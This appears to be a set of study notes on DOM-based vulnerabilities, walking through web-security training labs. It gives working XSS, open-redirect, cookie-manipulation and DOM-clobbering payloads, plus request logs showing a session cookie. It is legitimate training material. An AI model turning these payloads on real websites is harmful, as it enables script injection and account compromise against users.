# DOM-based vulnerabilities

### Overview

DOM-based vulnerabilities arise when a website contains JavaScript that takes an attacker-controllable value, known as a source, and passes it into a dangerous function, known as a sink. Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.

Source - A source is a JavaScript property that accepts data that is potentially attacker-controlled.

- Common sources

  ```
  document.URL
  document.documentURI
  document.URLUnencoded
  document.baseURI
  location
  document.cookie
  document.referrer
  window.name
  history.pushState
  history.replaceState
  localStorage
  sessionStorage
  IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
  Database
  ```

Sink - A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it.

POC of a DOM-based vulnerabilities:

```
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```

### Controlling the web message source

More on [web messaging](https://www.tutorialspoint.com/html5/html5_web_messaging.htm) here

POC of a DOM-based vulnerabilities:

```
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

POC of a DOM-based exploits:

```
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

### DOM XSS using web messages

Source code reveals:

```
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
})                 
```

Solution:

```
<iframe src="https://0a820001043a5362c1d6c170003800f5.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### Lab: DOM XSS using web messages and a JavaScript URL

Calling Javascript with href as seen [here](https://stackoverflow.com/questions/4163879/call-javascript-function-from-url-address-bar)

Source code reveals:

```
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

Solution:

```
<iframe src="https://0a11009203718b5ac097769500370007.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

### Lab: DOM XSS using web messages and JSON.parse

JSON needs to be in double quotes, as seen [here](https://teamtreehouse.com/community/do-json-property-names-really-need-to-be-in-double-quotes-is-this-an-old-requirement#:~:text=Properties%20in%20JSON%20have%20to,at%20all%20is%20not%20allowed.)

Source code reveals:

```
window.addEventListener('message', function(e) {
  var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
  document.body.appendChild(iframe);
  try {
      d = JSON.parse(e.data);
  } catch(e) {
      return;
  }
  switch(d.type) {
      case "page-load":
          ACMEplayer.element.scrollIntoView();
          break;
      case "load-channel":
          ACMEplayer.element.src = d.url;
          break;
      case "player-height-changed":
          ACMEplayer.element.style.width = d.width + "px";
          ACMEplayer.element.style.height = d.height + "px";
          break;
  }
}, false);
```

Solution:

```
<iframe src="https://0a81000203153730c071285d0006009f.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"url\":\"javascript:print()\",\"type\":\"load-channel\"}","*")'>
```

### Lab: DOM-based open redirection 

Source code reveals:

```
<div class="is-linkback">
    <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'>Back to Blog</a>
</div>
```

Solution:

1. Set URL to https://0a7600420362243bc068fb3600ff00ab.web-security-academy.net/post?postId=4&url=https://exploit-0a9400a503ca24b9c0d0fbfb01ef0079.web-security-academy.net

2. Click on "Back to Blog"

### Lab: DOM-based cookie manipulation

GET /product?productId=19 HTTP/1.1
Host: 0abd003004e35b28c0b6e09400ae0077.web-security-academy.net
Cookie: session=EmjrI07hbqjMkXYXhmzJEXG1CrDNPKvG; lastViewedProduct=https://0abd003004e35b28c0b6e09400ae0077.web-security-academy.net/product?productId=asd
...

<header class="navigation-header">
    <section class="top-links">
        <a href=/>Home</a><p>|</p>
        <a href='asd'>Last viewed product</a><p>|</p>
    </section>
</header>

GET /product?productId=19 HTTP/1.1
Host: 0abd003004e35b28c0b6e09400ae0077.web-security-academy.net
Cookie: session=EmjrI07hbqjMkXYXhmzJEXG1CrDNPKvG; lastViewedProduct=asd'>lololol
...

<header class="navigation-header">
    <section class="top-links">
        <a href=/>Home</a><p>|</p>
        <a href='asd'>lololol'>Last viewed product</a><p>|</p>
    </section>
</header>

GET / HTTP/1.1
Host: 0abd003004e35b28c0b6e09400ae0077.web-security-academy.net
Cookie: session=EmjrI07hbqjMkXYXhmzJEXG1CrDNPKvG; lastViewedProduct=asd'><script>alert('asd')</script>

<header class="navigation-header">
    <section class="top-links">
        <a href=/>Home</a><p>|</p>
        <a href='asd'><script>alert('asd')</script>'>Last viewed product</a><p>|</p>
    </section>
</header>

GET / HTTP/1.1
Host: 0abd003004e35b28c0b6e09400ae0077.web-security-academy.net
Cookie: session=EmjrI07hbqjMkXYXhmzJEXG1CrDNPKvG; lastViewedProduct=https://0abd003004e35b28c0b6e09400ae0077.web-security-academy.net/product?productId=3'><script>alert(1)</script>


<script>
    console.log("preparing payload")
</script>
<!--First payload sets the cookie for the NEXT page render/reload-->
<iframe 
  id="hehe"
  name="hehe"
  src="https://0abd003004e35b28c0b6e09400ae0077.web-security-academy.net/product?productId=3#'><script>print()</script>"
>
</iframe>
<!--Second payload forces a page render using the newly set cookies to trigger our javascript code-->
<script>
    setTimeout(() => { document.getElementById('hehe').src = "https://0abd003004e35b28c0b6e09400ae0077.web-security-academy.net/product?productId=3" }, 1000);
</script>

https://stackoverflow.com/questions/86428/what-s-the-best-way-to-reload-refresh-an-iframe

### Lab: Exploiting DOM clobbering to enable XSS - Only works in Chrome

https://www.w3schools.com/html/html_entities.asp

https://sendgrid.com/blog/embedding-images-emails-facts/

https://packetstormsecurity.com/files/166389/OX-App-Suite-7.10.5-Cross-Site-Scripting.html

https://github.com/payloadbox/xss-payload-list

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:canbeanythinginbetweenherebutmusthavecidcollonbeforeittotriggeronerror&quot;onerror=alert(1)//everythingaftermeincludingmeisignored">
```

- Using `cid:` forces the created `<img>` tag's `src` property to start with `cid:` which is easier to corrupt and trigger the onerror function that we will add

- No double quote infront of `alert(1)` hence the javascript will auto add double quotes which mangles with the `alert()` function (i.e. `onerror="alert(1)""`). To fix this add `//` causes the `"` to be ignored and allows the payload to work

```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:canbeanythinginbetweenherebutmusthavecidcollonbeforeittotriggeronerror&quot;onerror=&quot;alert(1)//everythingaftermeincludingmeisignored">

<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:canbeanythinginbetweenherebutmusthavecidcollonbeforeittotriggeronerror&quot;onerror=&quot;alert(1)">
```

### Lab: Clobbering DOM attributes to bypass HTML filters

```
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();
    let janitor = new HTMLJanitor({tags: {input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}}});

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let avatarImgElement = document.createElement("img");
            avatarImgElement.setAttribute("class", "avatar");
            avatarImgElement.setAttribute("src", comment.avatar ? comment.avatar : "/resources/images/avatarDefault.svg");

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + janitor.clean(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(avatarImgElement);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = janitor.clean(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};
```

https://github.com/guardian/html-janitor

https://hackerone.com/reports/308158

https://support.google.com/richmedia/answer/190941?hl=en#:~:text=In%20a%20URL%2C%20a%20hash,of%20the%20page%20or%20website.

```
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

```
<iframe src=https://0a0c00b3042e1fedc02a98d10113009b.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```

